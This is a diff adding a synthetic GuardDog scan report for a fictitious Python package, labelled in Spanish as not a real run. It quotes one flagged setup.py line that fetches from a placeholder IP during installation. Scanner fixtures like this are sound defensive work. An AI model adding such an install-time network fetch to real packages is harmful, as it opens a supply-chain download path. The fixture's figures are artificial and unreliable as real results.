@@ -1,0 +1,46 @@
+{
+ "_nota": "SINTÉTICO: no es una ejecución real. Estructura tomada del código fuente de guarddog v3.2.0 (guarddog/cli.py _scan_remote_sandboxed, analyzer/analyzer.py, reporters/json.py). Paquete ficticio. Reemplazar por una grabación real cuando GuardDog funcione vía Docker.",
+ "package": "paquete-ficticio",
+ "issues": 4,
+ "errors": {},
+ "results": {
+  "typosquatting": null,
+  "potentially_compromised_email_domain": "The maintainer's email domain (ejemplo-expirado.test) was registered after the package was last updated",
+  "bundled_binary": null,
+  "threat-setup-network-in-install": [
+   {
+    "location": "paquete-ficticio-1.0.0/setup.py:14",
+    "code": "urllib.request.urlopen('http://203.0.113.7/p')",
+    "match": "urlopen(",
+    "message": "Network access or system information collection during package installation"
+   }
+  ],
+  "capability-network-outbound": [
+   {
+    "location": "paquete-ficticio-1.0.0/setup.py:14",
+    "code": "urllib.request.urlopen('http://203.0.113.7/p')",
+    "match": "urlopen",
+    "message": "Outbound network communication"
+   }
+  ],
+  "threat-runtime-obfuscation-base64exec": {}
+ },
+ "path": "/tmp/tmpabc/paquete-ficticio",
+ "risk_score": {
+  "score": 7.4,
+  "label": "high_risk",
+  "findings_count": 3,
+  "score_breakdown": {"max_severity": "high", "num_stages": 2, "has_source_code_risks": true}
+ },
+ "risks": [
+  {
+   "name": "network-in-install",
+   "category": "execution",
+   "severity": "high",
+   "mitre_tactics": ["execution"],
+   "threat_rule": "threat-setup-network-in-install",
+   "file_path": "paquete-ficticio-1.0.0/setup.py"
+  }
+ ],
+ "package_version": "1.0.0"
+}
